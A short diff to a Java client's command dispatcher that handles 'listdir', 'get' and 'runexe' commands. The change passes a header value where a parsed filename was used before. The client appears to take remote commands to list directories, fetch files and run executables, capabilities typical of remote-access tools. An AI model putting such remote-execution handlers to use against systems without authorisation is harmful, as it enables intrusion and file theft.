@@ -161,8 +161,7 @@ public class MainClient {
         else if (command.equalsIgnoreCase("listdir")) {
             return listDir(id);
         } else if (command.equalsIgnoreCase("get")) {
-            String filename = parts[3].trim().replaceAll("\"","");
-            return getFile(id,filename);
+            return getFile(id,header);
         } else if (command.equalsIgnoreCase("runexe")){
             String filename = parts[3].trim().replaceAll("\"","");
             return runexefile(id,filename);
